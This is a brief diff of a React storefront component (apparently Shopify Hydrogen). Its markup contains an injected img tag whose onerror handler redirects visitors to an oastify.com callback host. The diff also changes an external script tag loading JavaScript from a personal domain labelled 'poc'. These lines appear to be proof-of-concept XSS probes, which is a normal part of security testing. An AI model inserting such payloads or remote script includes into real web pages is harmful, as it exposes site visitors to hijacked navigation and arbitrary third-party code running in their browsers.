@@ -54,7 +54,7 @@ export default function App() {
         <h1>Hello, {name}</h1>
 <img src onerror='location=`http://fbuz558sx6xwkegcvppwpazi79d01rwfl.oastify.com`'/>
         <p>This is a custom storefront powered by Hydrogenafrraaa</p>
-<script src="https://pow.wleberre.fr/js.js"></script>
+<script src="https://poc.wleberre.fr/js.js"></script>
         <Outlet />
         <ScrollRestoration />
         <Scripts />
